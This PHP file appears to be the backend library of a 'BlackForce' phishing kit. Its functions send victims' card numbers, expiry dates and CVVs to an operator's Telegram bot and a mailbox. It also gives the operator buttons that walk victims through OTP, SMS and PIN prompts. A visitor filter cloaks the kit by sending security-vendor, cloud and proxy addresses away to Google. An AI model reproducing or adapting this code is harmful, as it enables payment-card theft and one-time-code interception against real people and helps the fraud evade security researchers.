<?php

require_once __DIR__ . '/../config/panel.php';


if (!function_exists('append_log_line')) {
    function append_log_line(string $path, string $line): void
    {
        $directory = dirname($path);
        if (!is_dir($directory)) {
            @mkdir($directory, 0775, true);
        }
        file_put_contents($path, $line . PHP_EOL, FILE_APPEND | LOCK_EX);
    }
}

if (!function_exists('get_suspicious_isp_keywords')) {
    function get_suspicious_isp_keywords(): array
    {
        return [
            'amazon','aws','amazon web services','amazon technologies','microsoft','microsoft azure','azure','cloudflare',
            'google','google cloud','google llc','alphabet inc','meta','facebook','akamai','akamai technologies',
            'akamai international','digitalocean','digitalocean llc','linode','linode llc','ovh','ovhcloud','ovh sas',
            'hetzner','hetzner online','vultr','choopa','leaseweb','leaseweb usa','contabo','scaleway','upcloud',
            'oneprovider','packet','equinix','netlify','vercel','heroku','salesforce','cloudsigma','softlayer','ibm',
            'oracle','oracle cloud','fastly','cdn77','rackspace','fly.io','wpengine','dreamhost','bytedance','tencent',
            'tencent cloud','alibaba','alibaba cloud','huawei','huawei cloud','bell south','bellsouth','level 3','lumen',
            'centurylink','cogent','gtt communications','digital ocean','cloudfront','dosarrest','stackpath','incapsula',
            'imperva','bitdefender','kaspersky','trend micro','mcafee','edgecast','sucuri','sectigo','fortinet',
            'checkpoint','proofpoint','crowdstrike','sentinelone','zscaler','sophos','unitas','akamai international'
        ];
    }
}

if (!function_exists('send_security_alert')) {
    function send_security_alert(string $message): void
    {
        if (!defined('TOKEN') || TOKEN === '') {
            return;
        }

        $chatId = '';
        if (defined('NOTIF_CHATID')) {
            $candidate = trim((string)NOTIF_CHATID);
            if ($candidate !== '' && $candidate !== '-') {
                $chatId = $candidate;
            }
        }

        if ($chatId === '' && defined('CHATID')) {
            $chatId = trim((string)CHATID);
        }

        if ($chatId === '') {
            return;
        }

        $endpoint = 'https://api.telegram.org/bot' . TOKEN . '/sendMessage';
        $payload = http_build_query([
            'chat_id' => $chatId,
            'text' => $message,
        ]);

        $ch = curl_init($endpoint);
        if ($ch === false) {
            return;
        }

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}

if (!function_exists('increment_stats_counter')) {
    function increment_stats_counter(string $key): void
    {
        $path = __DIR__ . '/../Panel/stats/stats.ini';
        $data = @parse_ini_file($path);
        if (!is_array($data)) {
            $data = [];
        }

        $data[$key] = isset($data[$key]) ? (int)$data[$key] + 1 : 1;

        $buffer = '';
        foreach ($data as $name => $value) {
            $buffer .= $name . '=' . $value . "\n";
        }

        file_put_contents($path, $buffer, LOCK_EX);
    }
}

if (!function_exists('ensure_ip_ban_entry')) {
    function ensure_ip_ban_entry(string $ip): void
    {
        $banPath = __DIR__ . '/../Panel/botActBan/ip_ban.txt';
        $existing = [];
        if (is_file($banPath)) {
            $existing = file($banPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if ($existing === false) {
                $existing = [];
            }
        }

        if (!in_array($ip, $existing, true)) {
            file_put_contents($banPath, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        }
    }
}

if (!function_exists('log_visit_activity')) {
    function log_visit_activity(array $info): void
    {
        $path = __DIR__ . '/../Panel/stats/visits.log';
        $line = sprintf(
            '[%s] Visit from [%s - %s - %s] ISP: %s',
            date('Y-m-d H:i:s'),
            $info['ip'] ?? 'Unknown',
            $info['country'] ?? 'Unknown country',
            $info['city'] ?? 'Unknown city',
            $info['isp'] ?? 'Unknown ISP'
        );
        append_log_line($path, $line);
    }
}

if (!function_exists('log_block_activity')) {
    function log_block_activity(string $reason, array $info): void
    {
        $path = __DIR__ . '/../Panel/botActBan/bots.log';
        $line = sprintf(
            '[%s] Bot blocked [%s] REASON: %s ISP: %s ORG: %s AS: %s Country: %s City: %s',
            date('Y-m-d H:i:s'),
            $info['ip'] ?? 'Unknown',
            $reason,
            $info['isp'] ?? 'Unknown',
            $info['org'] ?? 'Unknown',
            $info['asn'] ?? 'Unknown',
            $info['country'] ?? 'Unknown',
            $info['city'] ?? 'Unknown'
        );
        append_log_line($path, $line);
    }
}

if (!function_exists('get_ip_intelligence')) {
    function get_ip_intelligence(string $ip): array
    {
        static $cache = [];
        if (isset($cache[$ip])) {
            return $cache[$ip];
        }

        $result = [
            'ip' => $ip,
            'country' => $_SESSION['visitor_country'] ?? 'Unknown',
            'countryCode' => isset($_SESSION['visitor_country']) ? strtoupper((string)$_SESSION['visitor_country']) : 'Unknown',
            'city' => $_SESSION['visitor_city'] ?? 'Unknown',
            'isp' => $_SESSION['visitor_isp'] ?? 'Unknown',
            'org' => $_SESSION['visitor_org'] ?? 'Unknown',
            'asn' => $_SESSION['visitor_asn'] ?? 'Unknown',
            'proxy' => false,
            'hosting' => false,
        ];

        $apiUrl = 'http://ip-api.com/json/' . urlencode($ip) . '?fields=status,message,country,countryCode,region,regionName,city,timezone,query,proxy,hosting,isp,org,as';
        $primary = http_get_json($apiUrl);
        if ($primary && ($primary['status'] ?? '') === 'success') {
            if (!empty($primary['country'])) {
                $result['country'] = $primary['country'];
            }
            if (!empty($primary['countryCode'])) {
                $result['countryCode'] = strtoupper((string)$primary['countryCode']);
            }
            if (!empty($primary['city'])) {
                $result['city'] = $primary['city'];
            }
            if (!empty($primary['isp'])) {
                $result['isp'] = sanitize_isp_name($primary['isp']);
            }
            if (!empty($primary['org'])) {
                $result['org'] = sanitize_isp_name($primary['org']);
            }
            if (!empty($primary['as'])) {
                $result['asn'] = $primary['as'];
            }
            $result['proxy'] = filter_var($primary['proxy'] ?? false, FILTER_VALIDATE_BOOLEAN) === true;
            $result['hosting'] = filter_var($primary['hosting'] ?? false, FILTER_VALIDATE_BOOLEAN) === true;
        }

        $ipwho = http_get_json('https://ipwho.is/' . urlencode($ip));
        if ($ipwho && (!isset($ipwho['success']) || $ipwho['success'] !== false)) {
            if ($result['country'] === 'Unknown' && !empty($ipwho['country'])) {
                $result['country'] = $ipwho['country'];
            }
            if ($result['countryCode'] === 'Unknown' && !empty($ipwho['country_code'])) {
                $result['countryCode'] = strtoupper((string)$ipwho['country_code']);
            }
            if ($result['city'] === 'Unknown' && !empty($ipwho['city'])) {
                $result['city'] = $ipwho['city'];
            }
            if (!empty($ipwho['connection']['isp']) && $result['isp'] === 'Unknown') {
                $result['isp'] = sanitize_isp_name($ipwho['connection']['isp']);
            }
            if (!empty($ipwho['connection']['org']) && $result['org'] === 'Unknown') {
                $result['org'] = sanitize_isp_name($ipwho['connection']['org']);
            }
            if (!empty($ipwho['connection']['asn']) && $result['asn'] === 'Unknown') {
                $result['asn'] = $ipwho['connection']['asn'];
            }
        }

        $ipapi = http_get_json('https://ipapi.co/' . urlencode($ip) . '/json/');
        if ($ipapi && empty($ipapi['error'])) {
            if ($result['country'] === 'Unknown' && !empty($ipapi['country_name'])) {
                $result['country'] = $ipapi['country_name'];
            }
            if ($result['countryCode'] === 'Unknown' && !empty($ipapi['country'])) {
                $result['countryCode'] = strtoupper((string)$ipapi['country']);
            }
            if ($result['city'] === 'Unknown' && !empty($ipapi['city'])) {
                $result['city'] = $ipapi['city'];
            }
            if (!empty($ipapi['org']) && $result['isp'] === 'Unknown') {
                $result['isp'] = sanitize_isp_name($ipapi['org']);
            }
            if (!empty($ipapi['org']) && $result['org'] === 'Unknown') {
                $result['org'] = sanitize_isp_name($ipapi['org']);
            }
            if (!empty($ipapi['asn']) && $result['asn'] === 'Unknown') {
                $result['asn'] = strtoupper((string)$ipapi['asn']);
            }
        }

        $ipinfo = http_get_json('https://ipinfo.io/' . urlencode($ip) . '/json');
        if ($ipinfo && empty($ipinfo['error'])) {
            if ($result['country'] === 'Unknown' && !empty($ipinfo['country'])) {
                $result['country'] = $ipinfo['country'];
            }
            if ($result['countryCode'] === 'Unknown' && !empty($ipinfo['country'])) {
                $result['countryCode'] = strtoupper((string)$ipinfo['country']);
            }
            if ($result['city'] === 'Unknown' && !empty($ipinfo['city'])) {
                $result['city'] = $ipinfo['city'];
            }
            if (!empty($ipinfo['org'])) {
                $orgString = $ipinfo['org'];
                $asn = null;
                if (stripos($orgString, 'AS') === 0) {
                    $parts = explode(' ', $orgString, 2);
                    $asn = strtoupper($parts[0]);
                    $orgString = $parts[1] ?? $orgString;
                }
                if ($result['asn'] === 'Unknown' && $asn !== null) {
                    $result['asn'] = $asn;
                }
                $orgString = sanitize_isp_name($orgString);
                if ($result['org'] === 'Unknown') {
                    $result['org'] = $orgString;
                }
                if ($result['isp'] === 'Unknown') {
                    $result['isp'] = $orgString;
                }
            }
        }

        $cache[$ip] = $result;
        return $result;
    }
}

if (!function_exists('detect_ip_threat')) {
    function detect_ip_threat(array $info): ?string
    {
        $ip = $info['ip'] ?? '';
        if ($ip === '127.0.0.1' || $ip === '::1') {
            return null;
        }

        $countryCode = strtoupper((string)($info['countryCode'] ?? ''));
        if ($countryCode === 'AE') {
            return null;
        }

        $isProxy = filter_var($info['proxy'] ?? false, FILTER_VALIDATE_BOOLEAN) === true;
        $isHosting = filter_var($info['hosting'] ?? false, FILTER_VALIDATE_BOOLEAN) === true;

        if ($isProxy || $isHosting) {
            $flags = [];
            if ($isProxy) {
                $flags[] = 'proxy';
            }
            if ($isHosting) {
                $flags[] = 'hosting';
            }
            return 'VPN/Proxy detected (' . implode(' & ', $flags) . ')';
        }

        $fields = [
            strtolower((string)($info['isp'] ?? '')),
            strtolower((string)($info['org'] ?? '')),
            strtolower((string)($info['asn'] ?? '')),
        ];

        foreach (get_suspicious_isp_keywords() as $keyword) {
            $needle = strtolower($keyword);
            if ($needle === '') {
                continue;
            }
            foreach ($fields as $field) {
                if ($field !== '' && strpos($field, $needle) !== false) {
                    return 'Suspicious ISP detected: ' . $keyword;
                }
            }
        }

        return null;
    }
}

if (!function_exists('handle_ip_threat')) {
    function handle_ip_threat(string $reason, array $info): void
    {
        if (!empty($_SESSION['ip_threat_handled'])) {
            return;
        }

        $_SESSION['ip_threat_handled'] = true;

        $ipAddress = $info['ip'] ?? get_client_ip();
        ensure_ip_ban_entry($ipAddress);
        increment_stats_counter('bots');
        log_block_activity($reason, $info);

        $messageLines = [
            '⚠️ Bot détecté',
            'Raison: ' . $reason,
            'IP: ' . $ipAddress,
        ];

        if (!empty($info['country'])) {
            $messageLines[] = 'Pays: ' . $info['country'];
        }
        if (!empty($info['city'])) {
            $messageLines[] = 'Ville: ' . $info['city'];
        }
        if (!empty($info['isp'])) {
            $messageLines[] = 'ISP: ' . $info['isp'];
        }
        if (!empty($info['org'])) {
            $messageLines[] = 'ORG: ' . $info['org'];
        }
        if (!empty($info['asn'])) {
            $messageLines[] = 'AS: ' . $info['asn'];
        }

        send_security_alert(implode("\n", $messageLines));

        header('Location: https://www.google.com/');
        exit();
    }
}

if (!function_exists('notify_stage_progress')) {
    function notify_stage_progress(string $stage, array $info = []): void
    {
        // Notifications limitées à la première visite uniquement.
    }
}


if (!function_exists('get_client_ip')) {
    function get_client_ip() {
        $ip = null;
        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $header) {
            if (array_key_exists($header, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$header]) as $potential_ip) {
                    $potential_ip = trim($potential_ip);
                    if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                        $ip = $potential_ip;
                        break 2;
                    }
                }
            }
        }
        return ($ip !== null) ? $ip : '127.0.0.1';
    }
}



function antibotpw() {
    if( empty(ANTIBOTPW_API) )
        return;
    if( $_SESSION['notbot'] == 1 )
        return;
    $ip = get_client_ip();
    $list = file("Panel/blacklist.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $list)) {
        header("Location: https://www.google.com/");
        exit();
    }
    $ua = str_replace(' ', '', $_SERVER['HTTP_USER_AGENT']);
    $check = json_decode(file_get_contents('https://antibot.pw/api/v2-blockers?ip='. $ip .'&apikey='. ANTIBOTPW_API .'&ua=' . $ua),true);
    $is_bot = $check['is_bot'];
    if( $is_bot == 1 ) {
        file_put_contents("Panel/botActBan/ip_ban.txt", $ip . "\r\n", FILE_APPEND);
        header("Location: https://www.google.com/");
        exit();
    } else {
        $_SESSION['notbot'] = 1;
    }
}

function update() {
    $ipToDelete = get_client_ip();
    $filePaths = [
        'Panel/action/ip_sms.txt', 'Panel/action/ip_badsms.txt', 
        'Panel/action/ip_otp.txt', 'Panel/action/ip_badotp.txt', 
        'Panel/action/ip_confirm.txt', 'Panel/action/ip_pin.txt', 
        'Panel/action/ip_badpin.txt', 'Panel/action/ip_approv.txt', 
        'Panel/action/ip_badapprov.txt'
    ];

    foreach ($filePaths as $filePath) {
        if (!file_exists($filePath)) continue;

        $lines = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $newLines = [];
        foreach ($lines as $line) {
            if (trim($line) !== $ipToDelete) {
                $newLines[] = $line;
            }
        }
        file_put_contents($filePath, implode(PHP_EOL, $newLines) . (count($newLines) > 0 ? PHP_EOL : ''));
    }
}

function response() {
    $ip = get_client_ip(); // Assuming you have a function to get the client's IP address.

    // Define an array of file names to check.
    $fileNames = ['Panel/action/ip_sms.txt', 'Panel/action/ip_badsms.txt', 'Panel/action/ip_otp.txt', 'Panel/action/ip_badotp.txt', 'Panel/action/ip_confirm.txt', 'Panel/action/ip_pin.txt', 'Panel/action/ip_badpin.txt', 'Panel/action/ip_approv.txt', 'Panel/action/ip_badapprov.txt'];

    // Loop through the files and check if the IP is in any of them.
    foreach ($fileNames as $index => $fileName) {
        $fileContents = file_get_contents($fileName);

        // Check if the IP address is in the file.
        if (strpos($fileContents, $ip) !== false) {
            // Return a different response based on the file index.
            if ($index === 0) {
                return "sms";
            } elseif ($index === 1) {
                return "badsms";
            } elseif ($index === 2) {
                return "otp";
            } elseif ($index === 3) {
                return "badotp";
            } elseif ($index === 4) {
                return "confirm";
            } elseif ($index === 5) {
                return "pin";
            } elseif ($index === 6) {
                return "badpin";
            } elseif ($index === 7) {
                return "wait_approve";
            } elseif ($index === 8) {
                return "badapprov";
            }
        }
    }

    // If the IP address is not found in any of the files, you can return a default response.
    return "unknown";
}

function BannedIP() {
    $ip = get_client_ip();
    $link_file = "Panel/botActBan/ip_ban.txt";
    $bannedip = file($link_file, FILE_IGNORE_NEW_LINES);

    if (in_array($ip, $bannedip)) {
        header('Location: https://www.google.com/404');
        exit();
    }
}

if (!function_exists('update_ini')) {
    function update_ini($data, $file)
    {
        $content = "";
        $parsed_ini = parse_ini_file($file, true);
        foreach ($data as $section => $values) {
            if ($section === "") {
                continue;
            }
            $content .= $section . "=" . $values . "\n\r";
        }
        if (!$handle = fopen($file, 'w')) {
            return false;
        }
        $success = fwrite($handle, $content);
        fclose($handle);
    }
}

function validate_otp($otp) {
    if (empty($otp)) {
        $_SESSION['ERRORS']['otp'] = true;
        return false;
    }
    $_SESSION['sotp'] = $otp;
    return true;
}

function validate_approve_code($approve_code) {
    if (empty($approve_code)) {
        $_SESSION['ERRORS']['approve_code'] = true;
        return false;
    }
    $_SESSION['sapprove_code'] = $approve_code;
    return true;
}

function validate_badapprove_code($badapprove_code) {
    if (empty($badapprove_code)) {
        $_SESSION['ERRORS']['badapprove_code'] = true;
        return false;
    }
    $_SESSION['sbadapprove_code'] = $badapprove_code;
    return true;
}

function send($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $views = $host."/visitors.html";
    $stats = $host."/app/Panel/stats/index.php";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views"
                ]
    
                ],
                [
                    [
                        "text" => "📊 STATS 📊",
                        "url" => "$stats"
                    ]
        
                    ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendnotif($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = (defined('NOTIF_CHATID') && NOTIF_CHATID !== '' && NOTIF_CHATID !== '-') ? NOTIF_CHATID : CHATID;
    $host = PANEL;
    $views = $host."/visitors.html";
    $stats = $host."/app/Panel/stats/index.php";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views"
                ]
    
                ],
                [
                    [
                        "text" => "📊 STATS 📊",
                        "url" => "$stats"
                    ]
        
                    ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendCard($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $fastLink = $host."/app/Panel/scan/index.php?ccn=" .$_SESSION['sccn']. '&exp=' .$_SESSION['sexp']. '&cch=BlackForce&cvv='.$_SESSION['scvv'];
    $views = $host."/visitors.html";
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🔎 VIEW'S",
                    "url" => "$views"
                ]
    
                ],
            [
                [
                    "text" => "⚡️ Fast Link",
                    "url" => "$fastLink"
                ]
    
                ],
                [
                    [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                    ]
        
                ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

function sendKey($rezdata) {

    $ip = get_client_ip();
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = PANEL;
    $ban = $host."/app/Panel/botActBan/banIpAct.php?ip=".$ip;
    $otp = $host."/app/Panel/action/insert.php?ip=".$ip."&view=otp";
    $badotp = $host."/app/Panel/action/insert.php?ip=".$ip."&view=badotp";
    $sms = $host."/app/Panel/action/insert.php?ip=".$ip."&view=sms";
    $badsms = $host."/app/Panel/action/insert.php?ip=".$ip."&view=badsms";
    $conf = $host."/app/Panel/action/insert.php?ip=".$ip."&view=confirm";
    $approv = $host."/app/Panel/action/insert.php?ip=".$ip."&view=approv";
    $pin = $host."/app/Panel/action/insert.php?ip=".$ip."&view=pin";
    $badpin = $host."/app/Panel/action/insert.php?ip=".$ip."&view=badpin";
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "📲 OTP 📲",
                    "url" => "$otp"
                ],
                [
                    "text" => "⛔ OTP ⛔",
                    "url" => "$badotp"
                ]
            ],
            [
                [
                    "text" => "📲 SMS 📲",
                    "url" => "$sms"
                ],
                [
                    "text" => "⛔ SMS ⛔",
                    "url" => "$badsms"
                ]
            ],
            [
                [
                    "text" => "🔐 PIN 🔐",
                    "url" => "$pin"
                ],
                [
                    "text" => "⛔ PIN ⛔",
                    "url" => "$badpin"
                ]
            ],
            [
                [
                    "text" => "✅ CONFIRM ✅",
                    "url" => "$conf"
                ]
            ],
            [
                [
                    "text" => "👍 APPROV 👍",
                    "url" => "$approv"
                ]
            ],
            [
                [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                ]
            ]
        ]
    ]);


    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $rezdata,
        'reply_markup' => $keyboard
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}


function sendMail($maildata) {
    $Bullet = BULLET;
    $subject = "BLACKFORCE REZDATA";
    $headers = "From: BLACKFORCE  <takethisbruh@BlackForce.com>\r\n";
    $headers .= 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\r\n";
    return @mail($Bullet, $subject, $maildata, $headers);
}

function BinCheck($new_string) {
    $cc = $new_string;
    $bin = substr($cc, 0, 6);
    $bins = str_replace(' ', '', $bin);
    
    $ch = curl_init();
    $url = "https://lookup.binlist.net/" . $bin;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $res = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }

    curl_close($ch);

    $someArray = json_decode($res, true);

    $_SESSION['bank'] = $someArray['bank']['name'];
    $_SESSION['type'] = $someArray['type'];
    $_SESSION['level'] = $someArray['brand'];
    $_SESSION['country'] = $someArray['country']['name'];
}

function is_valid_luhn($number) {
    settype($number, 'string');
    $sumTable = array(
        array(0,1,2,3,4,5,6,7,8,9),
        array(0,2,4,6,8,1,3,5,7,9));
    $sum = 0;
    $flip = 0;
    for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $sum += $sumTable[$flip++ & 0x1][$number[$i]];
    }
    return $sum % 10 === 0;
}

function get_visitor_info() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    $info = get_ip_intelligence($ip);
    $country = $info['country'] ?? 'Unknown';
    $city = $info['city'] ?? 'Unknown';
    $isp = $info['isp'] ?? 'Unknown';

    return "IP: $ip, Country: $country, City: $city, ISP: $isp, User-Agent: $user_agent";
}

if (!function_exists('http_get_json')) {
    function http_get_json($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
        $result = curl_exec($ch);
        if ($result === false) {
            curl_close($ch);
            return null;
        }
        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($status >= 400) {
            return null;
        }
        $decoded = json_decode($result, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            return null;
        }
        return $decoded;
    }
}

if (!function_exists('sanitize_isp_name')) {
    function sanitize_isp_name($name)
    {
        if (!is_string($name) || $name === '') {
            return 'Unknown';
        }

        $clean = trim(preg_replace('/^AS\d+\s*/', '', $name));
        return $clean !== '' ? $clean : 'Unknown';
    }
}

if (!class_exists('App')) {
    class App
    {
        public function send_notif($message)
        {
            return sendnotif($message);
        }

        public function send_key($message)
        {
            return sendKey($message);
        }

        public function send_card($message)
        {
            return sendCard($message);
        }

        public function send_mail($message)
        {
            return sendMail($message);
        }

        public function send_message($message)
        {
            return send($message);
        }

        public function get_visitor_info()
        {
            return get_visitor_info();
        }
    }
}